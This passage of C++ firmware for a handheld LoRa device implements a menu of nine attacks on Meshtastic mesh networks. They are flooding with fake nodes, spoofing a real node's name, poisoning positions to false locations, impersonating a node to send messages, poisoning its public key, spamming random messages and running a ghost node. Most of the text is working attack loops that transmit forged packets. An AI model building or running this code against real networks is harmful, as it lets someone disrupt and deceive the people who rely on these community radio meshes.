            uint8_t c = navPendingChar; navPendingCharValid = false; navPendingChar = 0;
            if (c == KEY_BACKSPACE) {
                if (len > 0) { buf[--len] = 0; changed = true; }
                else { keyRelease(); return false; }
            } else if (c == KEY_ENTER) { keyRelease(); return true; }
            else if (c >= 32 && c < 127) { if (len < (int)cap - 1) { buf[len++] = (char)c; buf[len] = 0; changed = true; } }
        }

        delay(40);
    }
}

static int selectNode(const char* title) {
    radioEnsure();
    int sel = 0, top = 0;
    const int rowH = 12, vis = 9, headerY = 15;
    bool redraw = true;
    enterDebounce();
    while (true) {
        pumpRx();
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); return -1; }
        else if (kp(';'))      { keyRelease(); if (sel > 0) sel--; redraw = true; }
        else if (kp('.'))      { keyRelease(); if (sel < nodedb.count - 1) sel++; redraw = true; }
        else if (kp(KEY_ENTER)){ keyRelease(); if (nodedb.count > 0) return sel; }

        if (sel < top) top = sel;
        if (sel >= top + vis) top = sel - vis + 1;

        if (redraw) {
            redraw = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 0); M5.Display.println(title);
            M5.Display.setTextSize(1);
            if (nodedb.count == 0) {
                M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                M5.Display.setCursor(5, headerY); M5.Display.println("Listening for nodes...");
            } else {
                for (int i = 0; i < vis; i++) {
                    int idx = top + i;
                    if (idx >= nodedb.count) break;
                    int y = headerY + i * rowH;
                    if (idx == sel) {
                        M5.Display.fillRect(0, y, M5.Display.width(), rowH, menuSelectedBackgroundColor);
                        M5.Display.setTextColor(menuTextFocusedColor);
                    } else {
                        M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                    }
                    M5.Display.setCursor(5, y);
                    M5.Display.println(nodedb.nodes[idx].long_name);
                }
            }
            M5.Display.display();
        }
        delay(80);
    }
}

static uint32_t hwSelect() {
    int sel = 0;
    bool redraw = true;
    enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); return 0; }  // 0 = random
        else if (kp(';'))      { keyRelease(); sel = (sel - 1 + (int)PM_HW_MODELS_COUNT) % (int)PM_HW_MODELS_COUNT; redraw = true; }
        else if (kp('.'))      { keyRelease(); sel = (sel + 1) % (int)PM_HW_MODELS_COUNT; redraw = true; }
        else if (kp(KEY_ENTER)){ keyRelease(); return HW_MODELS[sel].id; }
        if (redraw) {
            redraw = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 0); M5.Display.println("Select board");
            M5.Display.setTextSize(1);
            for (int i = 0; i < (int)PM_HW_MODELS_COUNT; i++) {
                int y = 15 + i * 12;
                if (i == sel) {
                    M5.Display.fillRect(0, y, M5.Display.width(), 12, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }
                M5.Display.setCursor(5, y);
                M5.Display.printf("%s %-12s %lu", i == sel ? ">" : " ", HW_MODELS[i].name, (unsigned long)HW_MODELS[i].id);
            }
            M5.Display.display();
        }
        delay(80);
    }
}

static void attackStatic(const char* name) {
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Display.setCursor(5, 0); M5.Display.println(name);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(5, 122); M5.Display.println("BKSP = stop");
    M5.Display.display();
}

static bool attackStop() {
    M5.update(); cardUpdate(); handleDnsRequestSerial();
    if (kp(KEY_BACKSPACE)) { keyRelease(); return true; }
    return false;
}

// Blocks attacks until the user confirms a preset in Setup LoRa (RF).
static bool requireLoRa() {
    if (configured) return true;
    pmStatus("Configure Setup LoRa (RF) first");
    return false;
}

// ---- Attack 1: Flood Nodes ----
static void ui_flood() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    uint8_t ch = channel_hash(presetIdx);
    uint8_t p  = presetIdx < 9 ? presetIdx : 5;
    int nc = numInput("Node count", 50, 1, 1000);
    if (nc < 0) { radioStop(); return; }
    uint32_t node_count = (uint32_t)nc;
    uint32_t min_s = flood_min_duration_s(node_count, p);
    int ds = numInput("Duration (s)", min_s + 5, min_s, 600);
    if (ds < 0) { radioStop(); return; }
    uint32_t dur_s = (uint32_t)ds;
    uint32_t sent = 0, dur_ms = dur_s * 1000, start = millis();
    uint32_t delayMs = FLOOD_INTER_PKT_DELAY_MS[p];
    attackStatic("Flood Nodes");
    while (millis() - start < dur_ms && sent < node_count) {
        TxPacket pkt = attack_flood_node(attackerId, ch);
        if (pkt.valid) { poisonRadioTx(pkt.data, pkt.len); sent++; delay(delayMs); }
        M5.Display.fillRect(0, 20, M5.Display.width(), 30, TFT_BLACK);
        M5.Display.setTextSize(1.5);
        M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        M5.Display.setCursor(5, 26);
        M5.Display.printf("Sent: %lu / %lu", (unsigned long)sent, (unsigned long)node_count);
        if (attackStop()) break;
    }
    poisonRadioStartRx();
    pmStatus("Flood Nodes finished");
}

// ---- Attack 2: MeshGrow (toggle) ----
static void ui_meshgrow() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    uint8_t ch = channel_hash(presetIdx);
    bool active = false; uint32_t sent = 0, last = 0;
    const uint32_t INTERVAL = 10000;
    bool redraw = true;
    enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (kp(KEY_ENTER)) {
            keyRelease(); active = !active;
            if (active) last = millis() - INTERVAL; else poisonRadioStartRx();
            redraw = true;
        }
        if (active && millis() - last >= INTERVAL) {
            last = millis();
            float lat = ((float)(int32_t)(esp_random() % 160000000) / 1000000.0f) - 80.0f;
            float lon = ((float)(int32_t)(esp_random() % 360000000) / 1000000.0f) - 180.0f;
            uint32_t fid = random_node_id();
            char ln[24], sn[5];
            snprintf(ln, sizeof(ln), "Node-%04X", (uint16_t)fid);
            snprintf(sn, sizeof(sn), "%04X", (uint16_t)fid);
            uint8_t ub[128];
            size_t ul = proto_build_user(ub, sizeof(ub), fid, ln, sn, random_hw_model());
            if (ul > 0) { TxPacket pkt = build_packet(fid, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO, ub, ul, PM_DEFAULT_HOP_LIMIT, ch); if (pkt.valid) poisonRadioTx(pkt.data, pkt.len); }
            uint8_t pb[64];
            size_t pl = proto_build_position(pb, sizeof(pb), lat, lon, (int32_t)(esp_random() % 500));
            if (pl > 0) { TxPacket pkt = build_packet(fid, PM_BROADCAST_ADDR, PM_PORTNUM_POSITION, pb, pl, PM_DEFAULT_HOP_LIMIT, ch); if (pkt.valid) poisonRadioTx(pkt.data, pkt.len); }
            sent++;
            poisonRadioStartRx();
            redraw = true;
        }
        if (redraw) {
            redraw = false;
            attackStatic("MeshGrow");
            M5.Display.setTextSize(1);
            M5.Display.setCursor(5, 22);
            M5.Display.setTextColor(active ? menuTextFocusedColor : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.println(active ? "[ ACTIVE ]" : "[ stopped ]");
            M5.Display.setCursor(5, 36);
            M5.Display.printf("Nodes: %lu", (unsigned long)sent);
            M5.Display.setCursor(5, 50);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.println("ENTER ON/OFF");
            M5.Display.display();
        }
        delay(60);
    }
    radioStop();
}

// ---- Attack 3: Namechange ----
static void ui_namechange() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    int idx = selectNode("Namechange - Node");
    if (idx < 0) { radioStop(); return; }
    DiscoveredNode& t = nodedb.nodes[idx];

    char ln[40], ns[8];
    strncpy(ln, t.long_name, sizeof(ln) - 1); ln[sizeof(ln) - 1] = 0;
    strncpy(ns, t.short_name, sizeof(ns) - 1); ns[sizeof(ns) - 1] = 0;
    if (!textInput("Long name:", ln, sizeof(ln))) { radioStop(); return; }
    if (!textInput("Short name:", ns, sizeof(ns))) { radioStop(); return; }
    uint32_t hw = hwSelect();
    if (hw == 0) hw = random_hw_model();
    int ds = numInput("Duration (s)", 30, 5, 300);
    if (ds < 0) { radioStop(); return; }
    uint32_t dur_s = (uint32_t)ds;

    uint8_t ch = channel_hash(presetIdx);
    uint32_t sent = 0, start = millis(), dur_ms = dur_s * 1000;
    attackStatic("Namechange");
    while (millis() - start < dur_ms) {
        uint8_t ub[128];
        char id_str[12];
        snprintf(id_str, sizeof(id_str), "!%08x", t.node_id);
        uint8_t mac[6] = { 0x00, 0x11,
            (uint8_t)(t.node_id >> 24), (uint8_t)(t.node_id >> 16),
            (uint8_t)(t.node_id >> 8),  (uint8_t)(t.node_id) };
        ProtoWriter w(ub, sizeof(ub));
        w.write_field_string(1, id_str);
        w.write_field_string(2, ln);
        w.write_field_string(3, ns);
        w.write_field_bytes (4, mac, 6);
        w.write_field_uint32(5, hw);
        w.write_field_uint32(7, 1);
        if (w.ok() && w.size() > 0) {
            TxPacket pkt = build_packet(t.node_id, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO, ub, w.size(), PM_DEFAULT_HOP_LIMIT, ch);
            if (pkt.valid) { poisonRadioTx(pkt.data, pkt.len); sent++; }
        }
        M5.Display.fillRect(0, 20, M5.Display.width(), 20, TFT_BLACK);
        M5.Display.setTextSize(1);
        M5.Display.setCursor(5, 24);
        M5.Display.printf("Sent: %lu", (unsigned long)sent);
        if (attackStop()) break;
    }
    poisonRadioStartRx();
    pmStatus("Namechange finished");
}

// ---- Attack 4: Position Poison ----
struct Dest { const char* name; float lat; float lon; int32_t alt; };
static const Dest DESTS[] = {
    { "Islas Malvinas", -51.7963f,  -59.5236f,   0 },
    { "Egipto",          29.9792f,   31.1342f,  60 },
    { "Australia",      -25.2744f,  133.7751f, 300 },
    { "Roma",            41.8902f,   12.4922f,  21 },
};
static const uint8_t DEST_COUNT = 4;

static void ui_position() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    int idx = selectNode("Position Poison - Node");
    if (idx < 0) { radioStop(); return; }
    DiscoveredNode& t = nodedb.nodes[idx];

    int ds = 0; bool redraw = true; enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); radioStop(); return; }
        else if (kp(';'))      { keyRelease(); ds = (ds - 1 + DEST_COUNT) % DEST_COUNT; redraw = true; }
        else if (kp('.'))      { keyRelease(); ds = (ds + 1) % DEST_COUNT; redraw = true; }
        else if (kp(KEY_ENTER)){ keyRelease(); break; }
        if (redraw) {
            redraw = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 0); M5.Display.println("Position Poison - Destination");
            M5.Display.setTextSize(1);
            for (int i = 0; i < DEST_COUNT; i++) {
                int y = 15 + i * 16;
                if (i == ds) {
                    M5.Display.fillRect(0, y, M5.Display.width(), 15, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }
                M5.Display.setCursor(5, y);
                M5.Display.printf("%s %s", i == ds ? ">" : " ", DESTS[i].name);
            }
            M5.Display.display();
        }
        delay(80);
    }

    int durIn = numInput("Duration (s)", 30, 5, 300);
    if (durIn < 0) { radioStop(); return; }
    uint32_t dur_s = (uint32_t)durIn;
    uint8_t ch = channel_hash(presetIdx);
    uint32_t sent = 0, start = millis(), dur_ms = dur_s * 1000;
    attackStatic("Position Poison");
    while (millis() - start < dur_ms) {
        TxPacket pkt = attack_position_poison(attackerId, t.node_id, DESTS[ds].lat, DESTS[ds].lon, DESTS[ds].alt, ch);
        if (pkt.valid) { poisonRadioTx(pkt.data, pkt.len); sent++; }
        M5.Display.fillRect(0, 20, M5.Display.width(), 20, TFT_BLACK);
        M5.Display.setTextSize(1);
        M5.Display.setCursor(5, 24);
        M5.Display.printf("Sent: %lu", (unsigned long)sent);
        if (attackStop()) break;
    }
    poisonRadioStartRx();
    pmStatus("Position Poison finished");
}

// ---- Attack 5: Mesh Move (toggle) ----
static void ui_meshmove() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    uint8_t ch = channel_hash(presetIdx);
    bool active = false; uint32_t total = 0;
    uint8_t cursor = 0, tgt = 0;
    uint32_t activatedAt = 0, lastAction = 0;
    const uint32_t WAIT_FIRST = 60000, REPEAT = 30000;
    bool redraw = true;
    enterDebounce();
    while (true) {
        pumpRx();
        uint32_t now = millis();
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (kp(KEY_ENTER)) {
            keyRelease(); active = !active; redraw = true;
            if (active) { activatedAt = now; lastAction = 0; cursor = 0; tgt = 0; }
        }
        if (active && nodedb.count > 0) {
            if (cursor >= nodedb.count) cursor = 0;
            bool fire = (lastAction == 0) ? (now - activatedAt >= WAIT_FIRST) : (now - lastAction >= REPEAT);
            if (fire) {
                DiscoveredNode& t = nodedb.nodes[cursor];
                uint8_t ub[128];
                size_t ul = proto_build_user(ub, sizeof(ub), t.node_id, "Moved", "MOV", random_hw_model());
                if (ul > 0) { TxPacket pkt = build_packet(t.node_id, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO, ub, ul, PM_DEFAULT_HOP_LIMIT, ch); if (pkt.valid) poisonRadioTx(pkt.data, pkt.len); }
                uint8_t pb[64];
                size_t pl = proto_build_position(pb, sizeof(pb), DESTS[tgt].lat, DESTS[tgt].lon, DESTS[tgt].alt);
                if (pl > 0) { TxPacket pkt = build_packet(t.node_id, PM_BROADCAST_ADDR, PM_PORTNUM_POSITION, pb, pl, PM_DEFAULT_HOP_LIMIT, ch); if (pkt.valid) poisonRadioTx(pkt.data, pkt.len); }
                total++; lastAction = now;
                cursor = (cursor + 1) % nodedb.count;
                tgt = (tgt + 1) % DEST_COUNT;
                poisonRadioStartRx();
                redraw = true;
            }
        }
        if (redraw) {
            redraw = false;
            attackStatic("Mesh Move");
            M5.Display.setTextSize(1);
            M5.Display.setCursor(5, 22);
            M5.Display.setTextColor(active ? menuTextFocusedColor : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.println(active ? "[ ACTIVE ]" : "[ stopped ]");
            M5.Display.setCursor(5, 36);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            if (nodedb.count == 0) M5.Display.println("Listening for nodes...");
            else {
                M5.Display.printf("%u/%u: %s", cursor + 1, nodedb.count, nodedb.nodes[cursor].long_name);
            }
            M5.Display.setCursor(5, 50);
            M5.Display.printf("Attacks: %lu", (unsigned long)total);
            M5.Display.setCursor(5, 64);
            M5.Display.println("ENTER ON/OFF");
            M5.Display.display();
        }
        delay(80);
    }
    radioStop();
}

// ---- Attack 6: Mesh Impersonator ----
static void ui_impersonator() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    int idx = selectNode("Impersonator - Node");
    if (idx < 0) { radioStop(); return; }
    DiscoveredNode& t = nodedb.nodes[idx];
    char msg[200] = "";
    if (!textInput("Message:", msg, sizeof(msg))) { radioStop(); return; }
    int ct = numInput("Message count", 1, 1, 100);
    if (ct < 0) { radioStop(); return; }
    uint32_t count = (uint32_t)ct;
    uint8_t ch = channel_hash(presetIdx);
    attackStatic("Mesh Impersonator");
    for (uint32_t i = 0; i < count; i++) {
        TxPacket pkt = build_packet(t.node_id, PM_BROADCAST_ADDR, PM_PORTNUM_TEXT_MESSAGE,
                                    (const uint8_t*)msg, strlen(msg), PM_DEFAULT_HOP_LIMIT, ch);
        if (pkt.valid) poisonRadioTx(pkt.data, pkt.len);
        M5.Display.fillRect(0, 20, M5.Display.width(), 24, TFT_BLACK);
        M5.Display.setTextSize(1);
        M5.Display.setCursor(5, 24);
        M5.Display.printf("Sent %lu / %lu", (unsigned long)(i + 1), (unsigned long)count);
        uint32_t ws = millis();
        while (millis() - ws < 500) {
            M5.update(); cardUpdate(); handleDnsRequestSerial();
            if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
            delay(10);
        }
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
    }
    poisonRadioStartRx();
    pmStatus("Impersonator finished");
}

// ---- Attack 7: PKI Poison ----
static void ui_pki() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    int idx = selectNode("PKI Poison - Node");
    if (idx < 0) { radioStop(); return; }
    DiscoveredNode& t = nodedb.nodes[idx];
    int ds = numInput("Duration (s)", 30, 5, 300);
    if (ds < 0) { radioStop(); return; }
    uint32_t dur_s = (uint32_t)ds;
    uint8_t ch = channel_hash(presetIdx);
    uint32_t sent = 0, start = millis(), dur_ms = dur_s * 1000;
    attackStatic("PKI Poison");
    while (millis() - start < dur_ms) {
        TxPacket pkt = attack_pki_poison(attackerId, t.node_id, t.long_name, t.short_name, ch);
        if (pkt.valid) { poisonRadioTx(pkt.data, pkt.len); sent++; }
        M5.Display.fillRect(0, 20, M5.Display.width(), 20, TFT_BLACK);
        M5.Display.setTextSize(1);
        M5.Display.setCursor(5, 24);
        M5.Display.printf("Sent: %lu", (unsigned long)sent);
        if (attackStop()) break;
    }
    poisonRadioStartRx();
    pmStatus("PKI Poison finished");
}

// ---- Attack 8: ChattyMesh (toggle) ----
static void ui_chatty() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    uint8_t ch = channel_hash(presetIdx);
    bool active = false; uint32_t sent = 0, last = 0;
    const uint32_t INTERVAL_MIN = 2000, INTERVAL_MAX = 6000;
    uint32_t cur = INTERVAL_MIN;
    static const char ALPHABET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .!?";
    bool redraw = true;
    enterDebounce();
    while (true) {
        pumpRx();
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        if (kp(KEY_ENTER)) {
            keyRelease(); active = !active;
            if (active) { if (poison_lora_on && poison_sx) poison_sx->standby(); last = millis() - INTERVAL_MIN; }
            else poisonRadioStartRx();
            redraw = true;
        }
        if (active && nodedb.count > 0 && millis() - last >= cur) {
            uint32_t vi = esp_random() % nodedb.count;
            DiscoveredNode& v = nodedb.nodes[vi];
            uint8_t ml = 8 + (uint8_t)(esp_random() % 57);
            char msg[65];
            for (uint8_t i = 0; i < ml; i++) msg[i] = ALPHABET[esp_random() % (sizeof(ALPHABET) - 1)];
            msg[ml] = 0;
            TxPacket pkt = build_packet(v.node_id, PM_BROADCAST_ADDR, PM_PORTNUM_TEXT_MESSAGE, (const uint8_t*)msg, ml, PM_DEFAULT_HOP_LIMIT, ch);
            if (pkt.valid) { poisonRadioTx(pkt.data, pkt.len); sent++; }
            last = millis();
            cur = INTERVAL_MIN + (esp_random() % (INTERVAL_MAX - INTERVAL_MIN + 1));
            poisonRadioStartRx();
            redraw = true;
        }
        if (redraw) {
            redraw = false;
            attackStatic("ChattyMesh");
            M5.Display.setTextSize(1);
            M5.Display.setCursor(5, 22);
            M5.Display.setTextColor(active ? menuTextFocusedColor : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.println(active ? "[ ACTIVE ]" : "[ stopped ]");
            M5.Display.setCursor(5, 36);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.printf("Messages: %lu", (unsigned long)sent);
            M5.Display.setCursor(5, 50);
            M5.Display.printf("Nodes in range: %u", nodedb.count);
            M5.Display.setCursor(5, 64);
            M5.Display.println("ENTER ON/OFF");
            M5.Display.display();
        }
        delay(60);
    }
    radioStop();
}

// ---- Attack 9: GhostMesh ----
static void ui_ghost() {
    if (!requireLoRa()) return;
    ensureAttacker();
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    uint8_t ch = channel_hash(presetIdx);
    if (!ghostExists) {
        ghostHw = random_hw_model();
        uint8_t priv[32];
        if (!x25519_keypair(ghostPub, priv)) {
            ghostId = random_node_id();
            memset(ghostPub, 0, 32);
        } else {
            ghostId = crc32_ieee(ghostPub, 32);
            if (ghostId == 0) ghostId = 1;
        }
        snprintf(ghostLong,  sizeof(ghostLong),  "Ghost-%04X", (uint16_t)ghostId);
        snprintf(ghostShort, sizeof(ghostShort), "G%03X",  (uint16_t)ghostId & 0xFFF);
        if (!textInput("Long name:", ghostLong, sizeof(ghostLong))) { radioStop(); return; }
        if (!textInput("Short name:", ghostShort, sizeof(ghostShort))) { radioStop(); return; }
        ghostExists = true;
    }

    int sel = 1; bool redraw = true;
    static const char* OPTS[] = { "< Back", "Send message", "Re-announce node" };
    const uint8_t OPT_N = 3;
    enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        else if (kp(';'))      { keyRelease(); if (sel > 0) sel--; redraw = true; }
        else if (kp('.'))      { keyRelease(); if (sel < OPT_N - 1) sel++; redraw = true; }
        else if (kp(KEY_ENTER)) {
            keyRelease();
            if (sel == 0) break;
            else if (sel == 2) {
                uint8_t ub[128];
                size_t ul = proto_build_user(ub, sizeof(ub), ghostId, ghostLong, ghostShort, ghostHw, ghostPub, 32);
                if (ul > 0) { TxPacket pkt = build_packet(ghostId, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO, ub, ul, PM_DEFAULT_HOP_LIMIT, ch); if (pkt.valid) poisonRadioTx(pkt.data, pkt.len); }
                pmStatus("Node announced");
                redraw = true;
            } else {
                char msg[200] = "";
                if (textInput("Message:", msg, sizeof(msg)) && msg[0]) {
                    TxPacket pkt = build_packet(ghostId, PM_BROADCAST_ADDR, PM_PORTNUM_TEXT_MESSAGE, (const uint8_t*)msg, strlen(msg), PM_DEFAULT_HOP_LIMIT, ch);
                    if (pkt.valid) poisonRadioTx(pkt.data, pkt.len);
                    pmStatus("Message sent");
                }
                redraw = true;
            }
        }
        if (redraw) {
            redraw = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 0); M5.Display.println("GhostMesh");
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 18);
            M5.Display.printf("Node: %s", ghostLong);
            M5.Display.setCursor(5, 30);
            M5.Display.printf("id: !%08x  hw: %lu", ghostId, (unsigned long)ghostHw);
            for (uint8_t i = 0; i < OPT_N; i++) {
                int y = 44 + i * 14;
                if (i == sel) {
                    M5.Display.fillRect(0, y, M5.Display.width(), 13, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }
                M5.Display.setCursor(5, y);
                M5.Display.printf("%s %s", i == sel ? ">" : " ", OPTS[i]);
            }
            M5.Display.display();
        }
        delay(80);
    }
    radioStop();
}

// ---- Live Nodes (passive): real-time list of heard Meshtastic nodes ----
static void ui_live() {
    if (!requireLoRa()) return;
    if (!radioEnsure()) { pmStatus("SX1262 radio not detected"); return; }
    int top = 0;
    uint32_t lastDraw = 0;
    enterDebounce();
    while (true) {
        pumpRx();
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); break; }
        else if (kp(';')) { keyRelease(); if (top > 0) top--; }
        else if (kp('.')) { keyRelease(); if (top + 1 < nodedb.count) top++; }
        if (millis() - lastDraw > 400) {
            lastDraw = millis();
            const int rowH = 12, vis = 8, headerY = 16;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            char hd[28]; snprintf(hd, sizeof hd, "Live Nodes  %u", nodedb.count);
            M5.Display.setCursor(5, 0); M5.Display.println(hd);
            M5.Display.setTextSize(1);
            if (nodedb.count == 0) {
                M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                M5.Display.setCursor(5, headerY); M5.Display.println("Listening for nodes...");
            } else {
                if (top > nodedb.count - 1) top = nodedb.count - 1;
                if (top < 0) top = 0;
                for (int i = 0; i < vis; i++) {
                    int idx = top + i;
                    if (idx >= nodedb.count) break;
                    int y = headerY + i * rowH;
                    DiscoveredNode& nd = nodedb.nodes[idx];
                    uint32_t age = (millis() - nd.last_seen) / 1000;
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                    M5.Display.setCursor(5, y);
                    M5.Display.printf("%-12.12s %ddBm %lus%s", nd.long_name, nd.rssi,
                                      (unsigned long)age, nd.has_position ? " G" : "");
                }
            }
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 122); M5.Display.println(";/. scroll  BKSP stop");
            M5.Display.display();
        }
        delay(30);
    }
    radioStop();
}

// ---- Setup LoRa (region/preset selector) ----
static void ui_lora_setup() {
    int field = 0;  // 0 = region, 1 = preset, 2 = slot
    bool redraw = true;
    enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_ENTER)) { keyRelease(); configured = true; radioEnsure(); break; }
        else if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
        else if (kp(';')) { keyRelease(); field = (field + 2) % 3; redraw = true; }
        else if (kp('.')) { keyRelease(); field = (field + 1) % 3; redraw = true; }
        else if (kp(',')) { keyRelease(); redraw = true;
            if (field == 0) { regionIdx = (regionIdx - 1 + PM_NUM_REGIONS) % PM_NUM_REGIONS; pmSlot = 1; }
            else if (field == 1) { presetIdx = (presetIdx - 1 + PM_NUM_PRESETS) % PM_NUM_PRESETS; pmSlot = 1; }
            else if (pmSlot > 1) pmSlot--;
        }
        else if (kp('/')) { keyRelease(); redraw = true;
            if (field == 0) { regionIdx = (regionIdx + 1) % PM_NUM_REGIONS; pmSlot = 1; }
            else if (field == 1) { presetIdx = (presetIdx + 1) % PM_NUM_PRESETS; pmSlot = 1; }
            else { uint16_t ns = calc_num_slots(regionIdx, presetIdx); if (ns < 1) ns = 1; if (pmSlot < ns) pmSlot++; }
        }
        if (redraw) {
            redraw = false;
            const MeshRegion& r = REGIONS[regionIdx];
            const MeshPreset& p = PRESETS[presetIdx];
            uint16_t ns = calc_num_slots(regionIdx, presetIdx); if (ns < 1) ns = 1;
            if (pmSlot > ns) pmSlot = ns;
            float freq = calc_freq_mhz(regionIdx, presetIdx, pmSlot);
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 0); M5.Display.println("Setup LoRa (RF)");
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(field == 0 ? TFT_YELLOW : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 22);
            M5.Display.printf("%c Region: %-7s %.1f-%.1f MHz", field == 0 ? '>' : ' ', r.name, r.freqStart, r.freqEnd);
            M5.Display.setTextColor(field == 1 ? TFT_YELLOW : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 34);
            M5.Display.printf("%c Preset: %-12s", field == 1 ? '>' : ' ', p.name);
            M5.Display.setTextColor(field == 2 ? TFT_YELLOW : menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 46);
            M5.Display.printf("%c Slot: %u / %u", field == 2 ? '>' : ' ', pmSlot, ns);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 62);
            M5.Display.printf("  Freq: %.3f MHz", freq);
            M5.Display.setCursor(5, 74);
            M5.Display.printf("  SF%u  BW %.1f kHz  CR 4/%u  TX %u dBm", p.sf, p.bwKHz, p.cr, r.maxPower);
            M5.Display.setTextColor(0x5AEB, TFT_BLACK);
            M5.Display.setCursor(5, 100); M5.Display.println("; .  field");
            M5.Display.setCursor(5, 112); M5.Display.println(", /  value");
            M5.Display.setCursor(5, 124); M5.Display.println("ENTER save   BKSP back");
            M5.Display.display();
        }
        delay(80);
    }
}

#undef nodedb
} // namespace pm
